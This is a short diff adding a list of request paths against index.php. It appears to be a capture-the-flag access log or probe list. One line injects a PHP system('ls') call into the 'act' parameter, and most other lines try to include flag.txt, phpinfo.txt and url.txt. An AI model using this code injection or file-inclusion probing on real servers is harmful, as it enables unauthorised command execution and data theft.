@@ -1,0 +1,18 @@
+
+/index.php?act=<?php system('ls');?>
+/index.php?act=url.txt
+/index.php
+/index.php?act=flag.txt
+/index.php?act=flag.txt
+/
+/index.php?act=flag.txt
+/index.php?act=flag.txt
+/index.php?act=flag.txt
+/index.php?act=flag.txt
+/index.php
+/index.php?act=flag.txt
+/index.php
+/index.php?act=flag.txt
+/index.php
+/index.php?act=flag.txt
+/index.php?act=phpinfo.txt
